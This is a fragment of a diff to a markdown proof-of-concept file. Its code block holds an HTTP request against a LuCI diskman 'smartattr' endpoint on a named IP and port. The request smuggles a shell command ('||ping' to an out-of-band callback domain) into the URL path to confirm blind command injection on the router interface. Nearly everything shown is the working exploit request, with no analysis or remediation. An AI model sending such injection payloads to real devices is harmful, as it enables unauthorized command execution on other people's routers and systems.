@@ -1,7 +1,4 @@
 ## poc
-
-### poc路由构造理解
-
 ```C
 GET /cgi-bin/luci/admin/system/diskman/smartattr/{{urlescape(||ping 71oi4kwf.eyes.sh)}} HTTP/1.1
 Host: 114.132.79.71:7889
